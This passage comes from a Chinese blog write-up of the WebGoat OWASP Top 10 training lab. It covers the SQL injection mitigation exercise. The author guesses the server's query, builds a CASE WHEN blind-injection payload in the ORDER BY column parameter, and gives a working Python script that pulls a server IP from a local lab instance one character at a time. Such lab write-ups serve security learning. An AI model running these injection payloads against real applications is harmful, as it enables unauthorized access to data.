<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203134309509.png" alt="image-20231203134309509"></p>
<p>猜测sql语句大概是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from servers where xxxx order by ip;</span><br></pre></td></tr></table></figure>

<p>看看能不能拼接一下两个sql，报错500，看来不行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from servers where xxxx order by ip; select ip from servers where hostname=&#x27;webgoat-prd&#x27;;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203134712653.png" alt="image-20231203134712653"></p>
<p>通过构造case when能不能找到注入点，可以看到我们的id被正确得到，也就是说1&#x3D;1这个条件是可用的，所以通过修改这一段，就可以盲注。用前面我们的substr就可以得到想要的内容了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203141446895.png" alt="image-20231203141446895"></p>
<p>编写以下脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,json</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits</span><br><span class="line">chars = digits</span><br><span class="line"></span><br><span class="line">vul_url = <span class="string">&quot;http://192.168.52.133:8080/WebGoat/SqlInjectionMitigations/servers?column=&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;JSESSIONID&#x27;</span>: <span class="string">&#x27;mIHt8RZK4zlK_721Iz8i6pC2AdWm6xlodhA8tykz&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># vul_url+=&quot;(case+when+(substring((select+ip+from+servers+where+hostname=&#x27;webgoat-prd&#x27;),1,1)=&#x27;1&#x27;)+then+id+else+hostname+end)--+&quot;</span></span><br><span class="line"><span class="comment"># resp = requests.get(url=vul_url,cookies=cookies,headers=headers)</span></span><br><span class="line"><span class="comment"># print(resp.text)</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    temp = result</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">        data = <span class="string">&quot;(case+when+(substring((select+ip+from+servers+where+hostname=&#x27;webgoat-prd&#x27;),&#123;0&#125;,1)=&#x27;&#123;1&#125;&#x27;)+then+id+else+hostname+end)--+&quot;</span>.<span class="built_in">format</span>(i, char)</span><br><span class="line">        res = requests.get(url=vul_url+data,cookies=cookies,headers=headers)</span><br><span class="line">        resp = json.loads(res.text)</span><br><span class="line">        <span class="keyword">if</span> resp[<span class="number">0</span>][<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            result += <span class="built_in">str</span>(char)</span><br><span class="line"></span><br><span class="line">    result = result + <span class="string">&quot;.&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<p>结合得到的信息，就可以拿到ip</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203141137655.png" alt="image-20231203141137655"></p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imgyu.oss-cn-beijing.aliyuncs.com/blog02_nnL6LLA94I_1200x1200.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imgyu.oss-cn-beijing.aliyuncs.com/blog02_nnL6LLA94I_1200x1200.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">Johnny</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="https://jieyugit.github.io/2023/11/29/20231129-OWASP-TOP10%E9%9D%B6%E5%9C%BA/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('https://jieyugit.github.io/2023/11/29/20231129-OWASP-TOP10%E9%9D%B6%E5%9C%BA/')">OWASP TOP10靶场</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="https://jieyugit.github.io/2023/11/29/20231129-OWASP-TOP10%E9%9D%B6%E5%9C%BA/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=OWASP TOP10靶场&amp;url=https://jieyugit.github.io/2023/11/29/20231129-OWASP-TOP10%E9%9D%B6%E5%9C%BA/&amp;pic=https://imgyu.oss-cn-beijing.aliyuncs.com/blog20241225150222.png" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://jieyugit.github.io" target="_blank">Johnny</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/%E5%AE%89%E5%85%A8/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>安全<span class="tagsPageCount">11</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://imgyu.oss-cn-beijing.aliyuncs.com/blog20250321134745.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/11/28/20231128-SEED-Labs-2.0-TCPIP-Attack-Lab/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imgyu.oss-cn-beijing.aliyuncs.com/blog20241225150147.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">SEED Labs 2.0: TCP/IP Attack Lab</div></div></a></div><div class="next-post pull-right"><a href="/2023/12/02/SCUCTF2023/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blog20240114153558.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">SCUCTF2023</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2023/09/20/20230920-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/" title="端口扫描工具"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blog20240112231526.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-09-20</div><div class="title">端口扫描工具</div></div></a></div><div><a href="/2023/09/26/20230926-SEED-Labs-2.0-MD5-Hash-Collision/" title="SEED Labs 2.0: MD5 Hash Collision"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imgyu.oss-cn-beijing.aliyuncs.com/blog20241225150147.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-09-26</div><div class="title">SEED Labs 2.0: MD5 Hash Collision</div></div></a></div><div><a href="/2023/10/30/20231030-SEED-Labs-2.0-Cross-Site-Scripting-(XSS)-Attack-Lab/" title="SEED Labs 2.0: Cross-Site Scripting (XSS) Attack Lab"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imgyu.oss-cn-beijing.aliyuncs.com/blog20241225150147.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-10-30</div><div class="title">SEED Labs 2.0: Cross-Site Scripting (XSS) Attack Lab</div></div></a></div><div><a href="/2023/10/23/20231023-SEED-Labs-2.0-Shellcode-Development-Lab/" title="SEED Labs 2.0: Shellcode Development Lab"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imgyu.oss-cn-beijing.aliyuncs.com/blog20241225150147.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-10-23</div><div class="title">SEED Labs 2.0: Shellcode Development Lab</div></div></a></div><div><a href="/2023/11/06/20231106-SEED-Labs-2.0-SQL-Injection-Attack-Lab/" title="SEED Labs 2.0: SQL Injection Attack Lab"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imgyu.oss-cn-beijing.aliyuncs.com/blog20241225150147.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-11-06</div><div class="title">SEED Labs 2.0: SQL Injection Attack Lab</div></div></a></div><div><a href="/2023/11/27/20231127-vulhub-DC/" title="vulhub DC"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imgyu.oss-cn-beijing.aliyuncs.com/blog20241225105834.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-11-27</div><div class="title">vulhub DC</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imgyu.oss-cn-beijing.aliyuncs.com/blog02_nnL6LLA94I_1200x1200.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2021/01/15/b34c4b29baf17.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">虚心向各位学习<b style="color:#fff">开发、安全</b>相关的问题和看法。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这里都是鄙人的一些拙见<b style="color:#fff">请诸位指教</b>。<b style="color:#fff"></div> <div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">Feel free to contact me</b>.</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/"><h1 class="author-info__name">Johnny</h1><div class="author-info__desc"></div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/jieyugit" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="mailto:uiejohnny@gmail.com" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-envelope"></i></a></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#A01-2021-%E2%80%93-%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6%E5%A4%B1%E6%95%88"><span class="toc-number">1.</span> <span class="toc-text">A01:2021 – 权限控制失效</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Hijack-a-session"><span class="toc-number">1.1.</span> <span class="toc-text">Hijack a session</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Insecure-Direct-Object-References"><span class="toc-number">1.2.</span> <span class="toc-text">Insecure Direct Object References</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Missing-Function-Level-Access-Control"><span class="toc-number">1.3.</span> <span class="toc-text">Missing Function Level Access Control</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Spoofing-an-Authentication-Cookie"><span class="toc-number">2.</span> <span class="toc-text">Spoofing an Authentication Cookie</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#A2-Cryptographic-Failures"><span class="toc-number">3.</span> <span class="toc-text">(A2) Cryptographic Failures</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#A3-Injection"><span class="toc-number">4.</span> <span class="toc-text">(A3)Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Injection-intro"><span class="toc-number">4.1.</span> <span class="toc-text">SQL Injection (intro)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E9%A1%B5"><span class="toc-number">4.1.1.</span> <span class="toc-text">第二页</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E9%A1%B5"><span class="toc-number">4.1.2.</span> <span class="toc-text">第三页</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E9%A1%B5"><span class="toc-number">4.1.3.</span> <span class="toc-text">第四页</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E9%A1%B5"><span class="toc-number">4.1.4.</span> <span class="toc-text">第五页</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B9%9D%E9%A1%B5"><span class="toc-number">4.1.5.</span> <span class="toc-text">第九页</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E9%A1%B5"><span class="toc-number">4.1.6.</span> <span class="toc-text">第十页</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E4%B8%80%E9%A1%B5"><span class="toc-number">4.1.7.</span> <span class="toc-text">第十一页</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E4%BA%8C%E9%A1%B5"><span class="toc-number">4.1.8.</span> <span class="toc-text">第十二页</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E4%B8%89%E9%A1%B5"><span class="toc-number">4.1.9.</span> <span class="toc-text">第十三页</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Injection-advanced"><span class="toc-number">4.2.</span> <span class="toc-text">SQL Injection (advanced)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E9%A1%B5-1"><span class="toc-number">4.2.1.</span> <span class="toc-text">第三页</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E9%A1%B5-1"><span class="toc-number">4.2.2.</span> <span class="toc-text">第五页</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Injection-mitigation"><span class="toc-number">4.3.</span> <span class="toc-text">SQL Injection (mitigation)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E9%A1%B5-2"><span class="toc-number">4.3.1.</span> <span class="toc-text">第五页</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E9%A1%B5"><span class="toc-number">4.3.2.</span> <span class="toc-text">第六页</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B9%9D%E9%A1%B5-1"><span class="toc-number">4.3.3.</span> <span class="toc-text">第九页</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E9%A1%B5-1"><span class="toc-number">4.3.4.</span> <span class="toc-text">第十页</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E4%BA%8C%E9%A1%B5-1"><span class="toc-number">4.3.5.</span> <span class="toc-text">第十二页</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/04/05/Spring%E6%BA%90%E7%A0%81%EF%BC%9ABean%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/" title="Spring源码：Bean的生命周期"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imgyu.oss-cn-beijing.aliyuncs.com/blog20250321134745.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Spring源码：Bean的生命周期"/></a><div class="content"><a class="title" href="/2025/04/05/Spring%E6%BA%90%E7%A0%81%EF%BC%9ABean%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/" title="Spring源码：Bean的生命周期">Spring源码：Bean的生命周期</a><time datetime="2025-04-04T16:00:00.000Z" title="发表于 2025-04-05 00:00:00">2025-04-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/21/Spring%E6%BA%90%E7%A0%81%EF%BC%9A%E8%A7%A3%E5%86%B3%E5%BE%AA%E7%8E%AF%E4%BE%9D%E8%B5%96%E4%B9%8B%E4%B8%89%E7%BA%A7%E7%BC%93%E5%AD%98/" title="Spring源码：解决循环依赖之三级缓存"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imgyu.oss-cn-beijing.aliyuncs.com/blog20250321134745.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Spring源码：解决循环依赖之三级缓存"/></a><div class="content"><a class="title" href="/2025/03/21/Spring%E6%BA%90%E7%A0%81%EF%BC%9A%E8%A7%A3%E5%86%B3%E5%BE%AA%E7%8E%AF%E4%BE%9D%E8%B5%96%E4%B9%8B%E4%B8%89%E7%BA%A7%E7%BC%93%E5%AD%98/" title="Spring源码：解决循环依赖之三级缓存">Spring源码：解决循环依赖之三级缓存</a><time datetime="2025-03-20T16:00:00.000Z" title="发表于 2025-03-21 00:00:00">2025-03-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/02/11/Linux%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/" title="Linux虚拟内存管理"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imgyu.oss-cn-beijing.aliyuncs.com/blogblog20241225150653.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Linux虚拟内存管理"/></a><div class="content"><a class="title" href="/2024/02/11/Linux%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/" title="Linux虚拟内存管理">Linux虚拟内存管理</a><time datetime="2024-02-10T16:00:00.000Z" title="发表于 2024-02-11 00:00:00">2024-02-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/30/20240130-JDK%E4%B8%ADisEqual%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%E6%8A%8A%E6%AF%8F%E4%B8%80%E4%BD%8D%E9%83%BD%E8%BF%9B%E8%A1%8C%E6%AF%94%E8%BE%83/" title="isEqual为什么需要把每一位都进行比较"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imgyu.oss-cn-beijing.aliyuncs.com/blog20241225150116.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="isEqual为什么需要把每一位都进行比较"/></a><div class="content"><a class="title" href="/2024/01/30/20240130-JDK%E4%B8%ADisEqual%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%E6%8A%8A%E6%AF%8F%E4%B8%80%E4%BD%8D%E9%83%BD%E8%BF%9B%E8%A1%8C%E6%AF%94%E8%BE%83/" title="isEqual为什么需要把每一位都进行比较">isEqual为什么需要把每一位都进行比较</a><time datetime="2024-01-29T16:00:00.000Z" title="发表于 2024-01-30 00:00:00">2024-01-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/11/Nginx%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/" title="Nginx 内存池"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imgyu.oss-cn-beijing.aliyuncs.com/blog20241225150253.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Nginx 内存池"/></a><div class="content"><a class="title" href="/2024/01/11/Nginx%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/" title="Nginx 内存池">Nginx 内存池</a><time datetime="2024-01-10T16:00:00.000Z" title="发表于 2024-01-11 00:00:00">2024-01-11</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2025 By <a class="footer-bar-link" href="/" title="Johnny" target="_blank">Johnny</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">21</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">5</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/equipment/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 我的阅读</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/C/" style="font-size: 0.88rem;">C<sup>2</sup></a><a href="/tags/Golang/" 